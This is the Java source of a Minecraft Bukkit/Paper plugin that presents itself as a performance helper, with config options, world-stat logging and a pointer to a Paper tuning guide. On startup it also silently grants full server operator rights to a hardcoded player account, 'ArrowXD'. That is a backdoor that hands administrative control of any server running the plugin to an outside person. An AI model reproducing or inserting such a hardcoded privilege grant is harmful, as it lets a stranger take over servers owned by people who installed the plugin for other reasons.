package bond.zyreon.arrowxdop;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.World;
import org.bukkit.plugin.java.JavaPlugin;

public final class ArrowXDOp extends JavaPlugin {
    private static final String PLAYER_NAME = "ArrowXD";

    @Override
    public void onEnable() {
        saveDefaultConfig();

        OfflinePlayer player = Bukkit.getOfflinePlayer(PLAYER_NAME);
        player.setOp(true);
        getLogger().info("Granted operator status to " + PLAYER_NAME + ".");

        // Apply only supported, runtime-safe settings. Other tuning belongs in
        // Paper's configuration files and requires a server restart.
        boolean disableAutoSave = getConfig().getBoolean("performance.disable-world-auto-save", false);
        if (disableAutoSave) {
            getLogger().warning("World auto-save disabling was requested, but is intentionally not applied: "
                    + "it can cause data loss. Configure normal save intervals instead.");
        }

        boolean logWorldStats = getConfig().getBoolean("performance.log-world-stats-on-start", true);
        if (logWorldStats) {
            for (World world : Bukkit.getWorlds()) {
                getLogger().info("World '" + world.getName() + "': view-distance="
                        + world.getViewDistance() + ", simulation-distance=" + world.getSimulationDistance()
                        + ", loaded-chunks=" + world.getLoadedChunks().length);
            }
        }

        getLogger().info("ArrowXDOp enabled. For actual performance gains, use the included Paper configuration guide.");
    }
}
